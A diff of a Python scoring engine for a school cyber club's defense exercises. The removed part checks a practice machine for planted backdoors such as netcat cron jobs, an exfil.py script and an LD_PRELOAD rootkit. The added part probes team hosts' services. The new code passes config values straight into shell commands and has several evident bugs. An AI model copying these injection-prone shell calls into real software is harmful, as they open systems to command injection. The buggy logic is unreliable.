@@ -1,287 +1,570 @@
-#!/usr/bin/env python3
-#~~~~~~~~~~~~~~~~~~~~~~~SETUP~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
-import os
-import sys
-import time
-import pwd
-import grp
-import subprocess
-from pylab import *
-from matplotlib.ticker import *
-import _datetime
-from multiprocessing import Process
-import numpy as np
-import matplotlib.pyplot as plt
-import urllib.request as urllib2
+import matplotlib.pyplot as plt 
+import subprocess, platform, os
+import hashlib
+import urllib.request
 import re
-mainUser = 'cyber' #the place to install ScoringEngine
-today = _datetime.date.today()
-#~~~~~~~~~~~~~~~~Create Classes~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
-class Service:
-	def __init__(self,name,port):
-		self.port = port
-		self.name = name
-	def getPort(self):
-		return self.port
-	def getName(self):
-		return self.name
-	def isDown(self):	
-		if os.system('''ss -tulpn | grep ''' + str(self.getPort()))  == 0:
-			return False
-		return True
-class User:
-	def __init__(self,name):
-			self.name=name
-	def getName(self):
-			return self.name	
-	def works(self):
-		try:
-			pwd.getpwnam(self.getName())
-			return True
-		except KeyError:
-			return False
-class Group:
-	def __init__(self,name):
-			self.name=name
-	def getName(self):
-			return self.name
-	def exists(self):
-		try:
-			grp.getgrnam(self.getName())
-			return True
-		except KeyError:
-			return False
+import time
+from difflib import SequenceMatcher
+import configparser
+from configparser import *
+import os.path
+from urllib.error import HTTPError, URLError
+import logging
+import socket
+import paramiko
+import ftplib
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#checkInterval=5
+#ftpFile = ""
+#ftpFileHash = ""
+#ftpPath = "" 
+#ftpUSR = ""
+#ftpPWD = ""
+serverFTPDir = ""
+apacheCheck = ""
+apacheWebsite = ""
+apachePRT = ""
+dataDirectory = ""
+mySQL_Query = ""
+mySQL_PWD = ""
+smbUSR = ""
+smbPWD = ""
+smbSHR = ""
+smbSHRFile = ""
+sshUSR = ""
+sshPWD = ""
+sshPRT = ""
+#####
+injectSSHCurr = ""
+injectSMBCurr = ""
+injectApacheCurr = ""
+injectSMTPCurr = ""
+injectMYSQLCurr = ""
+injectVNCCurr = ""
+injectRDPCurr = ""
+injectDNSCurr = ""
+injectSMBCurr = ""
+injectFTPCurr = ""
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+class CaseConfigParser(SafeConfigParser):
+    def optionxform(self, optionstr):
+        return optionstr
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+class Team:
+    def __init__(self, name, address):
+        self.name = name
+        self.address = address
+        self.ftpHIST = []
+        self.internetHIST = []
+        self.apacheHIST = []
+        self.sambaHIST = []
+        self.sshHIST = []
+        self.mysqlHIST = []
+        self.dnsHIST = []
+        self.rdpHIST = []
+        self.smtpHIST = []
+        self.vncHIST = []
+    def getName(self):
+        return self.name
+    def getAddress(self):
+        return self.address
 
-class Task:
-	def __init__(self,level, desc, val, boolean): #constructor
-		self.desc = desc
-		self.boolean = boolean
-		self.val = val
-		self.level = level
+    def isScored(self, service):
+        config = CaseConfigParser(os.environ)
+        config.read('Injects.cnf')
+        if (config.get('Teams', self.name + "Score_" + service) == "True"):
+            return (True)
+        else:
+            return (False)
 
-	#returns the point value of the task
-	def getValue(self):
-		return self.val
-	#returns the description of the task
-	def getLevel(self):
-		return self.level
-	#returns the level of the task
-	def getDescription(self):
-		return self.desc
+    def countUptime(self, service, currInject): 
 
-	#returns true if the boolean criterion is met
-	def isFixed(self):
-		if os.system(self.boolean) == 0: 
-		#runs the linux boolean command to see the result
-			return True
-		else:
-			return False
-#~~~~~~~~~~~~~~~~~~~~~~THINGS TO SCORE~~~~~~~~~~~~~~~~~~~~~~~~~#
-users = [User(mainUser) ] #If a user is deleted, you get a penalty
-services = [] #If a service is down, you get a penalty
-allTasks = [
-	Task('Returner','Among us popup removed', 5, '[ "$()" ]'),
-	Task('Returner','Firefox blocks popups', 5, '[ "$(grep dom.disable_open_during_load /home/'+ mainUser + '/.mozilla/firefox/eds9crjr.default/prefs.js)" ]'),
-	Task('Returner','Firefox HSTS file reinstated', 5, '[! "$( stat -c "%a %n" /home/'+ mainUser + '/.mozilla/firefox/eds9crjr.default/SiteSecurityServiceState.txt | grep 747)" ]'), 
-	Task('Returner','User games cannot be logged into', 5, '[ ! "$(grep games /etc/passwd | grep bash)" ]'),
-	Task('Returner','empire removed', 5, '[ ! "$(dpkg --list | grep empire)" ]'),
-	Task('Returner','Syslog should not be writeable by non root users', 2, '[ ! "$(stat -c "%a %n" /var/log/syslog | grep 747)" ]'),
-	Task('Returner','Prohibited MP3 files removed', 5, '[ ! "$(grep -R Roblox /home/cyber)" ]'),
-	Task('Returner','Martian packets logged', 5, '[ "$(grep net.ipv4.conf.all.log_martians /etc/sysctl.conf | grep 1)" ]'),
-	Task('Returner','login.defs Max password age set', 5, '[ ! "$(grep 120 /etc/login.defs)" ]'),
-	Task('Returner','Hidden sudoers README setting removed', 5, '[ ! "$(grep NOPASSWD /etc/sudoers.d/README)" ]'),
-	Task('Returner','Correct permissions on /etc/passwd set', 5, '[ ! "$(stat -c "%a %n" /etc/passwd | grep 747)" ]'),
-	Task('Returner','/etc/host malicious domain direction fixed', 5, '[ ! "$(grep virus.com /etc/hosts)" ]'),
-	Task('Returner','Sysctl execshield set', 5, '[ "$(grep kernel.exec-shield /etc/sysctl.conf)" ]'),
-	Task('Returner','protect symlinks', 5, '[ "$(grep 1 /proc/sys/fs/protected_symlinks)" ]'),
-	Task('Returner','Limits.conf coredumps restricted', 5, '[ "$((grep \'hard core\' /etc/security/limits.conf)" ]'),
-	Task('Returner','TCToUR via symlinks and hardlinks fixed', 5, '[ "$(grep 1 /proc/sys/fs/protected_hardlinks)" ]'),
-	Task('Returner','SSHD X11 forwarding disabled', 5, '[ "$(grep X11Forwarding /etc/ssh/sshd_config | grep no)" ]'),
-	Task('Returner','SSHD prevents root login', 5, '[ "$(grep PermitRoot /etc/ssh/sshd_config | grep no)" ]'),
-	Task('Returner','SSHD correct protocol set', 5, '[ "$(grep Protocol /etc/ssh/sshd_config | grep 2)" ]'),
-	Task('Returner','Bad permission on SSH keys directory fixed', 2, '[ "$(stat -c "%a %n" ~/.ssh | grep 700)" ]'),
-	Task('Returner','Bad Crontab removed', 5, '[ ! "$(grep netcat /var/spool/cron/crontabs/cyber)" ]'),
-	Task('Returner','Insecure protocol DECNET blocked to non system accounts', 5, '[ "$(grep net-pf-12 /etc/modprobe.d/blacklist-rare-network.conf | grep off)" ]'),
-	Task('Returner','APT backdoor installation', 5, '[ ! "$(grep "doing-your" /etc/apt/sources.list)" ]'),
-	Task('Returner','Firefox Backdoored', 5, '[ ! "$(grep netcat /usr/bin/firefox)" ]'),
-	Task('Returner','BASHRC fake sudo', 5, '[ ! "$(grep reboot /root/.bashrc)" ]'),
-	#~~~Backdoors~~~#
-	Task('Returner','Data exfiltration script removed for /etc/passwd', 5, '[ ! "$(ls /lib64 | grep exfil.py)" ]'),
-	#Task('Returner','Keylogger Removed', 5, '[ "$()" ]'),
-	Task('Returner','Bad user owns the Text Editor EMACS', 5, '[ ! "$(ls -al  /usr/bin | grep emacs | grep debruckenshire)" ]'),
-	Task('Returner','LD PRELOAD Rootkit removed', 5, '[ ! "$(grep ls /lib | grep selinux.so.3)" ]'),
-	Task('Returner','UFW backdoored', 5, '[ ! "$(grep reboot /usr/sbin/ufw)" ]')
-#~~~Scenario~~~#
+        if service == "internet":
+            if (checkInternet(self.address) == "Ok"):
+                self.internetHIST.append("1")
+                print("Internet reliable, added 1")
+                print(self.internetHIST)
+            else:
+                self.internetHIST.append("0")
+                print("Internet unreliable, added 0")
+                print(self.internetHIST)
+            internetReliability = str(self.internetHIST.count("1") + self.internetHIST.count("0") * (-5))
+            return internetReliability
+
+        if service == "ftp":
+            if (checkFTP(str(self.getAddress()), ftpFile, ftpFileHash, currInject) == "Ok"):
+                self.ftpHIST.append("1")
+                print("ftp reliable, added 1")
+                print(self.ftpHIST)
+            else:
+                self.ftpHIST.append("0")
+                print("ftp unreliable, added 0")
+                print(self.ftpHIST)
+            ftpReliability = str(self.ftpHIST.count("1") + self.ftpHIST.count("0") * (-5))
+            return ftpReliability
+
+        if service == "apache":
+            print("Service is apache")
+            if (check_apache2(str(self.getAddress()), apachePRT, apacheCheck, currInject) == "Ok"):
+                self.apacheHIST.append("1")
+                print("apache2 reliable, added 1")
+                print(self.apacheHIST)
+            else:
+                self.apacheHIST.append("0")
+                print("apache2 unreliable, added 0")
+                print(self.apacheHIST)
+            apacheReliability = str(self.apacheHIST.count("1") + self.apacheHIST.count("0") * (-5))
+            return apacheReliability
+
+        if service == "samba":
+            print("Service is samba")
+            if (checkSMB(str(self.getAddress()) , str(self.getName()), currInject) == "Ok"):
+                self.sambaHIST.append("1")
+                print("samba reliable, added 1")
+                print(self.sambaHIST)
+            else:
+                self.sambaHIST.append("0")
+                print("samba unreliable, added 0")
+                print(self.sambaHIST)
+            sambaReliability = str(self.sambaHIST.count("1") + self.sambaHIST.count("0") * (-5))
+            return sambaReliability
+
+        if service == "ssh":
+            print("Service is SSH")
+            if (checkSSH(str(self.getAddress()), sshPRT, sshUSR, sshPWD, currInject) == "Ok"):
+                self.sshHIST.append("1")
+                print("ssh reliable, added 1")
+                print(self.sshHIST)
+            else:
+                self.sshHIST.append("0")
+                print("ssh unreliable, added 0")
+                print(self.sshHIST)
+            sshReliability = str(self.sshHIST.count("1") + self.sshHIST.count("0") * (-5))
+            return sshReliability    
+
+        if service == "rdp":
+            print("Service is RDP")
+            if (checkRDP(str(self.getAddress()), currInject) == "Ok"):
+                self.rdpHIST.append("1")
+                print("rdp reliable, added 1")
+                print(self.rdpHIST)
+            else:
+                self.rdpHIST.append("0")
+                print("rdp unreliable, added 0")
+                print(self.rdpHIST)
+            rdpReliability = str(self.rdpHIST.count("1") + self.rdpHIST.count("0") * (-5))
+            return rdpReliability    
+
+        if service == "mysql":
+            print("Service is mysql")
+            if (checkMYSQL(str(self.getAddress(), mySQL_PWD , currInject)) == "Ok"):
+                self.mysqlHIST.append("1")
+                print("mysql reliable, added 1")
+                print(self.mysqlHIST)
+            else:
+                self.mysqlHIST.append("0")
+                print("mysql unreliable, added 0")
+                print(self.mysqlHIST)
+            mysqlReliability = str(self.mysqlHIST.count("1") + self.mysqlHIST.count("0") * (-5))
+            return mysqlReliability    
+
+        if service == "dns":
+            print("Service is DNS")
+            if (checkDNS(str(self.getAddress()), currInject) == "Ok"):
+                self.dnsHIST.append("1")
+                print("DNS reliable, added 1")
+                print(self.dnsHIST)
+            else:
+                self.dnsHIST.append("0")
+                print("dns unreliable, added 0")
+                print(self.dnsHIST)
+            dnsReliability = str(self.dnsHIST.count("1") + self.dnsHIST.count("0") * (-5))
+            return dnsReliability    
+
+        if service == "smtp":
+            print("Service is smtp")
+            if (checkSMTP(str(self.getAddress()), currInject) == "Ok"):
+                self.smtpHIST.append("1")
+                print("smtp reliable, added 1")
+                print(self.smtpHIST)
+            else:
+                self.smtpHIST.append("0")
+                print("smtp unreliable, added 0")
+                print(self.smtpHIST)
+            smtpReliability = str(self.smtpHIST.count("1") + self.smtpHIST.count("0") * (-5))
+            return smtpReliability 
+
+        if service == "vnc":
+            print("Service is vnc")
+            if (checkVNC(str(self.getAddress()), currInject) == "Ok"):
+                self.vncHIST.append("1")
+                print("vnc reliable, added 1")
+                print(self.vncHIST)
+            else:
+                self.vncHIST.append("0")
+                print("vnc unreliable, added 0")
+                print(self.vncHIST)
+            vncReliability = str(self.vncHIST.count("1") + self.vncHIST.count("0") * (-5))
+            return vncReliability 
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+allTeams = [
+    #Team('Irvine', '10.4.2.51'),
+    #Team('Vallejo', '10.4.2.60'),
+   # Team('Berkely', '10.4.2.40'),
+    Team('Oakland', '10.4.2.38') #,
+    #Team('Fresno', '10.4.2.52'),
+    #Team('Sacramento', '10.4.2.10'),
+    #Team('Santacruz', '10.4.2.55'),
+    #Team('Workstation', '10.4.2.53')
 ]
-groups = [] #groups that must exist, or else a penalty
-#~~~~~~~~~~~~~~~CREATE THE WEBSITE/CALCULATE POINTS~~~~~~~~~~~~~#
-def update():
-	percent = str(round(currentPoints / totalPoints * 100, 1)) + '%'
-	score = str(currentPoints) + " out of " + str(totalPoints) + " total points"
-	questionsAnswered = str(numFixedVulns) + " out of " + str(len(allTasks)) + " total tasks completed"
-	BeginnerSolved = 0
-	BeginnerTotal = 0
-	returnerSolved = 0
-	returnerTotal = 0
-	advancedSolved = 0
-	advancedTotal = 0
+def similar(a, b): #Just incase the hash has an extra space, don't feel like removing space
+    return SequenceMatcher(None, a, b).ratio()
 
-	for t in allTasks:
-			if t.getLevel() == 'Beginner':
-				BeginnerTotal = BeginnerTotal + 1
-			if t.getLevel() == 'Returner':
-				returnerTotal = returnerTotal + 1
-			if t.getLevel() == 'Advanced':
-				advancedTotal = advancedTotal + 1
-	h = open('/home/'+ mainUser +'/Desktop/ScoreReport.html','w')
-	h.write('<!DOCTYPE html> <html> <head> <meta name="viewport" content="width=device-width, initial-scale=1"> <style> * { box-sizing: border-box; } .column { float: left; padding: 10px; height: 1500px; } .left, .right { width: 25%; } .middle { width: 50%; } .row:after { content: ""; display: table; clear: both; }</style> </head> <body><div class="row"> <div class="column left" style="background-color:#0d60bf;"></div> <div class="row"> <div class="column middle" style="background-color:#fff;"><h1 style="text-align: center;"><span style="font-family: arial, helvetica, sans-serif;">Score Report</span></h1><h2 style="text-align: center;"><br /><span style="font-family: arial, helvetica, sans-serif;">' + percent + ' completed</span></h2><p> </p>')
-	h.write('<p><span style="font-family: arial, helvetica, sans-serif; text-align: center;"><strong>' + "Report Generated at: " + str(today) + '. </strong></span></p>')
-	h.write('<p><span style=color:red;"font-family: arial, helvetica, sans-serif;"><strong>' + str(penalties) + ' Points in Scoring Penalties</strong></span></p>')
-	h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(score) + '. </strong></span></p>')
-	h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(questionsAnswered) + '. </strong></span></p>')
-	h.write('<style> div { background-image: url(https://i.pinimg.com/originals/15/79/25/157925e28f33c43a30973791b2f787f4.jpg); background-blend-mode: lighten; } </style>')
-	h.write('<hr class="line2"><br>')
+def testSLABool(test):
+    if os.system(test) == 0: 
+        #runs the linux boolean command to see the result
+        return True
+    else:
+        return False
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+def checkInternet(ip):
+    hostname = ip
+    response = os.system("ping -c 1 " + hostname)
+    pingstatus = "Fail"
+    if response == 0:
+        pingstatus = "Ok"
+    else:
+        pingstatus = "Fail"
+    return pingstatus
 
-	for u in users:
-		if not u.works():
-			h.write('<p><span style=color:red;"font-size: 10pt;  font-family: arial, helvetica, sans-serif;">'
-                         + u.getName()
-                        + ' is NOT functional: - 5 points</span></p>')
-	for s in services:
-		if s.isDown():
-				h.write('<p><span style=color:red;color:red;"font-size: 10pt;  font-family: arial, helvetica, sans-serif;">'
-                         + s.getName()
-                        + ' is NOT functional or Using wrong port: - 5 points</span></p>')
-	for g in groups:
-		if not g.exists():
-				h.write('<p><span style=color:red;"font-size: 10pt;  font-family: arial, helvetica, sans-serif;">'
-                         + g.getName()
-                        + ' is NOT created: - 5 points</span></p>')
-	for t in allTasks:
-		if t.isFixed() and t.getLevel() == 'Beginner':
-			BeginnerSolved = BeginnerSolved + 1
-			h.write('<p><span style="font-size: 10pt; font-family: arial, helvetica, sans-serif;">'
-			+ '<span style="color:green;">Beginner</span>' + ' ' + t.getDescription() + ' '
-			+ str(t.getValue()) + ' points</span></p>')
+def checkFTP(ip, checkfile, filehash, cI):
+    #FTP BANNER GRAB
+    try:
+        if (int(cI) == 1):
+            if (testSLABool("nmap " + ip + " -p 21 | grep open")):
+                return ("Ok")
+            else:
+                return ("Fail")
+        
+        if (int(cI) == 2):
+            ftp = ftplib.FTP(ip) 
+            ftp.cwd(ftpPath)
+            ftp.login(ftpUSR, ftpPWD)
+            ftp.retrbinary("RETR " + checkfile, open(checkfile, 'wb').write)
+            f = "/home/" + serverFTPDir + "/Desktop/" + checkfile #FILE DOWNLOADED FROM CLIENT TO SERVER
+            checkHash = os.popen(("sha1sum " + f + "| cut -d' ' -f1")).read()
+            if (float(similar(checkHash,filehash)) >= 0.9):
+                print("FTP hashes match")
+                ftpstatus = "Ok"
+            else:
+                print("Client Hash: " + checkHash + " Server Hash: " + ftpFileHash)
+                ftpstatus = "Fail"
+            ftp.quit()
+        else:
+            print("SSH ERROR: Inject ID not found for " + cI + " of type: " + str(type(cI)))
+            return("Fail")
+    except Exception as e:
+        print("SSH ERROR: " + str(e))
+        return ("Fail")
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+def checkSMB(ip, teamName, cI):
+#smbclient -L //IP.Ad.dr.ess
+    #INJECT 1: Returns Ok if SMB is running
+    if (int(cI) == 1):
+        try:
+            if (os.system("smbclient -L //" + ip + " -U " + smbUSR + '%' + smbPWD)): #Linux, return true if works
+                return "Ok"
+            elif (os.system("smbclient -L //" + ip + " -U " + smbUSR + '%' + smbPWD)): #Windows, returns true if works
+                return "Ok"
+            else:
+                return "Fail"
+        except Exception as e:
+            print("Exception: " + e)
+            return "Fail"
+    #INJECT 2: Downloads a fi;e
+    if (int(cI) == 2): #Download SMB file
+        tempFileCheck = str(teamName) + ".txt" #tell them to add this file on client
+        try:
+            subprocess.call(['smbget', "smb://" + str(ip) + "/" + str(smbSHR) + "/" + str(tempFileCheck), "-U" , smbUSR + '%' + smbPWD])
+            subprocess.call(['smbget', "smb:\\\\" + str(ip) + "\\" + str(smbSHR) + "\\" + str(tempFileCheck), "-U" , smbUSR + '%' + smbPWD]) #Windows
+            if not (os.path.isfile(str(tempFileCheck))):
+                print("Error: could not get SMB file: " + str(tempFileCheck) + " from " + str(ip))
+                return ("Fail")
+            subprocess.call(['rm', '-rf', str(tempFileCheck)])
+            return("Ok")
+            print ("Deleted file: " +  str(tempFileCheck))
+        except Exception as e:
+            print("SMB ERROR: " + str(e))
+            subprocess.call(['rm', '-rf', str(tempFileCheck)])
+            return ("Fail")
+    else:
+        print("SMB ERROR: Inject ID not found for " + cI + " of type: " + str(type(cI)))
 
-		if t.isFixed() and t.getLevel() == 'Returner':
-			returnerSolved = returnerSolved + 1
-			h.write('<p><span style="font-size: 10pt; font-family: arial, helvetica, sans-serif;">'
-			+ '<span style="color:blue;">Returner</span>' + ' ' + t.getDescription() + ' '
-			+ str(t.getValue()) + ' points</span></p>')
+    if (int(cI) == 2):
+        tempFileCheck = str(smbSHRFile) #tell them to add this file on client
+        try:
+            subprocess.call(['smbget', "smb://" + str(ip) + "/" + str(smbSHR) + "/" + str(tempFileCheck), "-U" , smbUSR + '%' + smbPWD])
+            if not (os.path.isfile(str(tempFileCheck))):
+                print("Error: could not get SMB file: " + str(tempFileCheck) + " from " + str(ip))
+                return ("Fail")
+            subprocess.call(['rm', '-rf', str(tempFileCheck)])
+            return("Ok")
+            print ("Deleted file: " +  str(tempFileCheck))
+        except Exception as e:
+            print("SMB ERROR: " + str(e))
+            subprocess.call(['rm', '-rf', str(tempFileCheck)])
+            return ("Fail")
+    else:
+        print("SMB ERROR: Inject ID not found for " + cI + " of type: " + str(type(cI)))
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+def checkDNS(ip, cI): 
+    try:
+        if (int(cI) == 1):
+            if (os.system("nslookup " + ip + "| grep addr.arpa")):
+                return ("Ok")
+        else:
+            return ("Fail")
+    except Exception as e:
+        print("RDP ERROR: " + str(e))
+        return ("Fail")
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+def checkRDP(ip, cI): 
+    try:
+        if (int(cI) == 1):
+            if (testSLABool("nmap " + ip + " -p 3389 | grep open")):
+                return ("Ok")
+        else:
+            return ("Fail")
+    except Exception as e:
+        print("RDP ERROR: " + str(e))
+        return ("Fail")
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~# 
+def checkSSH(ip, port, usr, pwd, cI):
+    try:
+        if (int(cI) == 1):
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(str(ip), int(port), str(usr), str(pwd))
+            stdin, stdout, stderr = ssh.exec_command("ls -l")
+            lines = stdout.readlines()
+            print (lines)
+            return ("Ok")
+        else:
+            print("SSH ERROR: Inject ID not found for " + cI + " of type: " + str(type(cI)))
+            return("Fail")
+    except Exception as e:
+        print("SSH ERROR: " + str(e))
+        return ("Fail")
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+def checkVNC(ip, cI):
+    try:
+        if (int(cI) == 1):
+            if (testSLABool("nmap" + ip + " -p 5900 | grep open")):
+                return ("Ok")
+        else:
+            return ("Fail")
+    except Exception as e:
+        print("RDP ERROR: " + str(e))
+        return ("Fail")
 
-		if t.isFixed() and t.getLevel() == 'Advanced':
-			advancedSolved = advancedSolved + 1
-			h.write('<p><span style="font-size: 10pt; font-family: arial, helvetica, sans-serif;">'
-			+ '<span style="color:purple;">Advanced</span>' + ' ' + t.getDescription() + ' '
-			+ str(t.getValue()) + ' points</span></p>')
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+def checkSMTP(ip, cI): 
+    try:
+        if (int(cI) == 1):
+            if testSLABool("telnet " + ip + " " + "25" + "| grep SMTP"):
+                return ("Ok")
+        else:
+            return ("Fail")
+    except Exception as e:
+        print("RDP ERROR: " + str(e))
+        return ("Fail")
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+def checkMYSQL(ip, mysqlPass, cI):
+    try:
+        if (int(cI) == 1):
+            if (testSLABool("nmap" + ip + " -p 3306 | grep open")):
+                return ("Ok")
 
-	bS = str(BeginnerSolved) + " out of " + str(BeginnerTotal) + " Beginner tasks completed"
-	rS = str(returnerSolved) + " out of " + str(returnerTotal) + " returner tasks completed"
-	aS = str(advancedSolved) + " out of " + str(advancedTotal) + " advanced tasks completed"
-	h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(bS) + '. </strong></span></p>')
-	h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(rS) + '. </strong></span></p>')
-	h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(aS) + '. </strong></span></p>')
-	h.write('<img src=".graph.png" alt="Graph" width="350" height="250">')
-	h.write('</div> <div class="row"> <div class="column right" style="background-color:#0d60bf;"></div> </body>')
-	h.write('<meta http-equiv="refresh" content="20">')
-	h.write('<footer><h6>Cyber Club</h6></footer>')
+        if (int(cI) == 2):
+            if (testSLABool("mysql -u root " + "-p" + mysqlPass +" -h " + ip + " -e \"use wordpress ; describe wp_users;\";")):
+                return ("Ok")
+        else:
+            return ("Fail")
+    except Exception as e:
+        print("MYSQL ERROR: " + str(e))
+        return ("Fail")
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+def check_apache2(ip, apachePRT, apacheCheck, cI):
+    try:
+        if (int(cI) == 1):
+            if (testSLABool("nmap " + ip + " -p " + str(apachePRT) + " | grep open")):
+                return ("Ok")
+        if (int(cI) == 2):
+            url = str ("http://" + ip + "/" + apacheWebsite)
+            try:
+                response = urllib.request.urlopen(url, timeout=5).read().decode('utf-8')
+            except HTTPError as error:
+                logging.error('Data not retrieved because %s\nURL: %s', error, url)
+                return("Fail")
+            except URLError as error:
+                if isinstance(error.reason, socket.timeout):
+                    logging.error('socket timed out - URL %s', url)
+                    return("Fail")
+                else:
+                    logging.error('some other error happened')
+                    return("Fail")
+        else:
+            return ("Fail")
+    except Exception as e:
+        print("WEBSITE ERROR: " + str(e))
+        return ("Fail")
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
+def grapherFunction():
+    while (True): 
+#~~~~~~~~~~~VARIABLES~~~~~~~~~~~#
+        #Below Parameters on Injects.cnf. Must be same for ALL clients
+        global ftpFile
+        global ftpFileHash
+        global ftpPath
+        global serverFTPDir
+        global ftpUSR
+        global ftpPWD
+        #
+        global apacheCheck
+        global apacheWebsite
+        global dataDirectory
+        global apachePRT
+        #
+        global smbUSR
+        global smbPWD
+        global smbSHRFile
+        global smbSHR
+        #
+        global sshUSR
+        global sshPWD
+        global sshPRT
+        #
+        global mySQL_PWD 
+        global mySQL_Query
+        #
+        ######
+        global injectSMBCurr
+        global injectApacheCurr
+        global injectSSHCurr
+        global injectSMTPCurr 
+        global injectSMTPCurr
+        global injectVNCCurr 
+        global injectRDPCurr 
+        global injectDNSCurr 
+        global injectSMBCurr
+        global injectFTPCurr
+#~~~~~~~~~~~~~~~~~~~~~~#
+        config = CaseConfigParser(os.environ)
+        config.read('Injects.cnf')
+        injectSMBCurr = config.get('Injects', 'smbCurrInject')
+        injectApacheCurr = config.get('Injects', 'apacheCurrInject')
+        injectSSHCurr = config.get('Injects', 'sshCurrInject')
+        injectSMTPCurr =  config.get('Injects', 'smtpCurrInject')
+        injectMYSQLCurr =  config.get('Injects', 'mysqlCurrInject')
+        injectRDPCurr =  config.get('Injects', 'rdpCurrInject')
+        injectDNSCurr =  config.get('Injects', 'dnsCurrInject')
+        injectVNCCurr =  config.get('Injects', 'vncCurrInject')
+        injectFTPCurr =  config.get('Injects', 'ftpCurrInject')
+#~~~~~~~~~~~~~~~~~~~~~~#
+        checkInterval = int(config.get('General', 'checkInterval'))
+        ftpFile = config.get('General', 'ftpFile')
+        ftpFileHash = config.get('General', 'ftpFileHash')
+        ftpPath = config.get('General', 'ftpPath') #Path on the client where the file to be checked is stored
+        serverFTPDir = config.get('General', 'serverFTPDir')
+        ftpUSR = config.get('General', 'ftpUSR')
+        ftpPWD = config.get('General', 'ftpPWD')  
+        apacheCheck = config.get('General', 'apacheCheck') #string to look for in apache2 page
+        apacheWebsite = config.get('General', 'apacheWebsite') #page to look for for string
+        apachePRT = config.get('General', 'apachePRT')
+        dataDirectory = config.get('General', 'dataDirectory') #directory on server to store data
+        mySQL_Query = config.get('General', 'mySQL_Query')
+        smbUSR = config.get('General', 'smbUSR')
+        smbPWD = config.get('General', 'smbPWD')
+        smbSHR = config.get('General', 'smbSHR')
+        sshUSR = config.get('General', 'sshUSR')
+        sshPWD = config.get('General', 'sshPWD')
+        sshPRT = int(config.get('General', 'smbPRT'))
+        mySQL_PWD =  config.get('General', 'mySQL_PWD')
+    #~~~~~~~~~PLOT~~~~~~~~~# 
+        fig = plt.figure(dpi=80)
+        ax = fig.add_subplot(1,1,1)
+        table_data=[[" "], ["Internet"], ["Website"], ["SMB"], ["SSH"], ["RDP"], ["MYSQL"], ["DNS"], ["SMTP"], ["VNC"], ["FTP"]] # ["Internet"], ["Apache2"], ["SMB"], ["SSH"]
+        for t in allTeams:
+            table_data[0].append(t.getName())
+            #
+            if (t.isScored("internet")):
+                table_data[1].append(str(checkInternet (str(t.getAddress()))) + ":" + str(t.countUptime("internet", 1)))
+            if (not t.isScored("internet")):
+                table_data[1].append("N/A")
+            #
+            if (t.isScored("apache")):
+                table_data[2].append(str(check_apache2(t.getAddress(), apachePRT, apacheCheck, injectApacheCurr)) + ":" + str(t.countUptime("apache" , injectApacheCurr)))
+            if (not t.isScored("apache")):
+                table_data[2].append("N/A")
+            #
+            if (t.isScored("samba")):
+                table_data[3].append(str(checkSMB(t.getAddress(), t.getName(), injectSMBCurr)) + ":" + str(t.countUptime("samba", injectSMBCurr)))
+            if (not t.isScored("samba")):
+                table_data[3].append("N/A")
+            #
+            if (t.isScored("ssh")):
+                table_data[4].append(str(checkSSH(t.getAddress(), sshPRT, sshUSR, sshPWD, injectSSHCurr)) + ":" + str(t.countUptime("ssh", injectSSHCurr)))
+            if (not t.isScored("ssh")):
+                table_data[4].append("N/A")
 
-#~~~~~~~~~~~~~~~~~~~~~Make a bar popup on screen when you get points~~~~~~~~~~~~~~~~~~~~~~~#
-def notify(ph):
-	#Creates a popup on the screen
-	icon_path = "/usr/bin/scorebot/scoring.png"
-	if (ph[-1] > ph[-2]):
-		os.system('notify-send -i ' + icon_path + ' \'You Earned Points!\' ')
+            if (t.isScored("rdp")):
+                table_data[5].append(str(checkRDP(t.getAddress(),injectRDPCurr)) + ":" + str(t.countUptime("rdp", injectRDPCurr)))
+            if (not t.isScored("rdp")):
+                table_data[5].append("N/A")
 
-	if (ph[-1] < ph[-2]):
-		os.system('notify-send -i ' + icon_path + ' \'You Lost Points!\' ')
-#~~~~~~~~~~~~~~~~~~~~Send data to server~~~~~~~~~~~~~~~~~~~~~~~~~~#
-pointHistory = [0,0,0] #list containing the history of points, add 3 0's so chart looks better
-HasEnteredTeamInfo = False #Have they put in info in the GUI created by TeamInfo.py(example: none:single:none:none)
-dUSR = ""
-dMode = ""
-dServIP = ""
-key = "cool" #secret key so people can't just send data to the server to get points
-while True:
-	##Have array of previous points every 5 seconds and send the array to the returnScore.py
-	currentPoints = 0 #The amount of points you currently have
-	lastPoints = 0 #the previous current points
-	penalties = 0 #Number of penalties
-	numFixedVulns = 0
-	totalPoints = 0
+            if (t.isScored("mysql")):
